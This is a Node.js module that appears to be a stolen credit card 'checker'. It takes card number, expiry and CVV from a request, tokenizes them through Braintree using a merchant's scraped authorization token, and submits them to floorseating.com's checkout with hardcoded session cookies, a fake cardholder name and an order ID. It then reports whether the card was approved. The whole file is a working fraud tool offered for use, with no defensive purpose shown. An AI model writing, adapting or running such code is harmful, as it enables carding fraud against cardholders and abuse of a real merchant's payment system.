const axios = require('axios');

async function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

const MAX_RETRIES = 3;
const RETRY_DELAY = 2000;

function extractResponseMessage(html) {
    try {
        const validationErrorsMatch = html.match(/validation-summary-errors">\s*<ul>\s*<li>(.*?)<\/li>/s);
        if (validationErrorsMatch && validationErrorsMatch[1]) {
            return validationErrorsMatch[1].trim();
        }
        return "Unknown response";
    } catch (error) {
        return "Unknown response";
    }
}

async function tokenizeCreditCard(cc, attempt = 1) {
    try {
        const response = await axios({
            method: 'post',
            url: 'https://payments.braintree-api.com/graphql',
            data: {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'custom',
                    'sessionId': '08af1c39-850c-4097-8304-fa058af4b34f'
                },
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': cc.number,
                            'expirationMonth': cc.month,
                            'expirationYear': cc.year,
                            'cvv': cc.cvv,
                            'billingAddress': {
                                'postalCode': '11219',
                                'streetAddress': '5925 15TH AVE',
                                'countryName': 'United States',
                                'countryCodeAlpha2': 'US'
                            }
                        },
                        'options': {
                            'validate': false
                        }
                    }
                },
                'operationName': 'TokenizeCreditCard'
            },
            headers: {
                'authority': 'payments.braintree-api.com',
                'accept': '*/*',
                'accept-language': 'es-US,es-419;q=0.9,es;q=0.8',
                'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NDM4OTc0NDIsImp0aSI6IjAzYzA1OWZlLWFhNjgtNGE5OS05MTJkLWRhODFjNjI4YTI3OSIsInN1YiI6ImtzNnRzdzhuZjd2eWdybXIiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImtzNnRzdzhuZjd2eWdybXIiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.vyooPCH30EpoA2LDGgMT-Y9TGrTpYVGxnSma2grifCdMy3eY-o0SzvBq21t2AfF25JzgwjesQll8xBkMAsCvPg',
                'braintree-version': '2018-05-10',
                'content-type': 'application/json',
                'origin': 'https://www.floorseating.com',
                'referer': 'https://www.floorseating.com/',
                'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36'
            }
        });

        return response;
    } catch (error) {
        if (attempt < MAX_RETRIES) {
            await delay(RETRY_DELAY);
            return tokenizeCreditCard(cc, attempt + 1);
        }
        throw error;
    }
}

async function processPayment(nonce, cc, attempt = 1) {
    try {
        const response = await axios({
            method: 'post',
            url: 'https://www.floorseating.com/Checkout/_CreditCardPaymentForm/98',
            params: {
                'Length': '8'
            },
            data: new URLSearchParams({
                'ShowProfilesList': 'False',
                'CardType': '1',
                'CardName': 'Bruno Alexis Pepsis',
                'CardNumber': cc.number,
                'ExpirationMonth': cc.month,
                'ExpirationYear': cc.year,
                'SecurityCode': cc.cvv,
                'BasketId': '0',
                'OrderId': '27585',
                'MaxPaymentAmount': '0',
                'AllowAmountEntry': 'False',
                'AutoPostBackOnCardTypeChange': 'False',
                'SecurityCodeValidationEnabled': 'True',
                'PaymentProfileId': '0',
                'SubmitButton': 'CompleteBraintreeButtonSubmitted',
                'PaymentMethodNonce': nonce,
                'BraintreeErrorMessage': '',
                'X-Requested-With': 'XMLHttpRequest'
            }),
            headers: {
                'authority': 'www.floorseating.com',
                'accept': '*/*',
                'accept-language': 'es-US,es-419;q=0.9,es;q=0.8',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'cookie': '_gcl_au=1.1.1001783034.1742334260; _ga=GA1.1.105461335.1742334260; AC9.ASPXANONYMOUS=QZsjJunk6dSr83ltobPb9HT_GSqxmy30gMo2IYnZpDkukdXMQegTSA9KtAlKwqspYLebu90_pxi6roU3vzu-MNmZnrVg6tKT1E8UfG3PXxbA5l05wSEY304Ptckp4pIcr8gPoAoIuW0i8sfrXsAlHg2; AC9.SESSIONID=3hnr5ayitc1lxbdmwoed5ox5; cf_clearance=BALpqFNzh5eHJUQJCa4X1gsIcrh6I8hudYc2gk1dr.Q-1743810853-1.2.1.1-CqX3TDd1_L5UWlg2dheCsHaGqMFlHVx1C_I8ZdL4qF9KN.ZaEqBGIbnVw1dLnXWecI1bvOtU3ZcbpjKiHoXw7wWfe1eaZttOeG0VED0n5F5L0rntV2ltmRc5WfrcEg5rbMnx.TEE.b5YdEblodi0GT240pjBWxv309rh3.kV.5vsBb9hUg86jHzno_xrfGavAJAQXjYy8kUwoLRV9ke5oM8IQ9cN9Z2mXVcCdj1NMY4vERLu6.8ctLNvlFqvfkKSI4eE13M6KWKBlrvEPDwuLXEC8tlnufbvwDhmqCAAcJ3.G_utEODyHHZT1vr1f.XnKLcv9oItAlK_N2kQVU.pPSA94FFDh60XHi8t2bvVkvc',
                'origin': 'https://www.floorseating.com',
                'referer': 'https://www.floorseating.com/Members/PayMyOrder?OrderNumber=45937',
                'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest'
            }
        });

        return response;
    } catch (error) {
        if (attempt < MAX_RETRIES) {
            await delay(RETRY_DELAY);
            return processPayment(nonce, cc, attempt + 1);
        }
        throw error;
    }
}

async function checkCard(req, res) {
    try {
        const cc = req.query.cc;
        if (!cc) return res.json({ error: 'Falta la tarjeta' });

        const [number, month, year, cvv] = cc.split('|');
        const cardData = {
            number: number.trim(),
            month: month.trim(),
            year: year.trim(),
            cvv: cvv.trim()
        };

        const tokenResponse = await tokenizeCreditCard(cardData);
        const nonce = tokenResponse.data.data.tokenizeCreditCard.token;

        await delay(2000);

        const paymentResponse = await processPayment(nonce, cardData);
        const message = extractResponseMessage(paymentResponse.data);

        const declineMessages = [
            "Processor Declined",
            "Do Not Honor",
            "Insufficient Funds",
            "Transaction Not Allowed",
            "No Such Issuer",
            "Invalid Transaction",
            "Security Violation",
            "Card Not Activated",
            "Closed Card",
            "Gateway Rejected",
            "No Account",
            "Call Issuer",
            "Pick Up Card",
            "Expired Card"
        ];

        return res.json({
            message: message,
            approved: !declineMessages.some(decline => message?.includes(decline))
        });

    } catch (error) {
        return res.json({
            message: "Invalid CC",
            approved: false
        });
    }
}

module.exports = checkCard;
